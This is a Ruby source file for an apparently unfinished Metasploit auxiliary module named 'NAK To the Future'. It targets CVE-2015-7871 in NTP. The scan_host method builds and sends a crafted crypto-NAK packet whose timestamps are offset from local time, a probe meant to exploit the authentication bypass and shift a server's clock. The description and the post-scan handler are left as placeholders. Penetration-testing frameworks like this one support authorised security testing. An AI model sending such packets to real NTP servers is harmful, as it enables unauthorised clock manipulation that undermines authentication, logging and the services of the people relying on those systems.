##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::UDPScanner
  include Msf::Auxiliary::NTP

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NTP "NAK To the Future"',
      'Description'    => %q(
        Fill.  This.  In.
      ),
      'Author'         =>
        [
          'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://talosintel.com/reports/TALOS-2015-0069/' ],
          [ 'CVE', '2015-7871' ]
        ]
      )
    )

    register_options(
    [
      OptInt.new('OFFSET', [true, "Offset from local time, in seconds", 300]),
    ], self.class)
  end

  def scanner_process(data, shost, _sport)
    @results[shost] ||= []
    @results[shost] << data
  end

  def scan_host(ip)
    probe = Rex::Proto::NTP::NTPCryptoNAK.new
    probe.stratum = 1
    probe.poll = 10
    now = Time.now
    ts = ((now.to_i + 2208988800 + datastore['OFFSET']) << 32) + now.nsec
    probe.reference_timestamp = ts
    probe.origin_timestamp = ts
    probe.receive_timestamp = ts
    probe.transmit_timestamp = ts
    probe.payload = "\x00\x00\x00\x00"
    scanner_send(probe, ip, datastore['RPORT'])
  end

  def scanner_prescan(batch)
    @results = {}
  end

  def scanner_postscan(_batch)
    # do something here...
  end
end
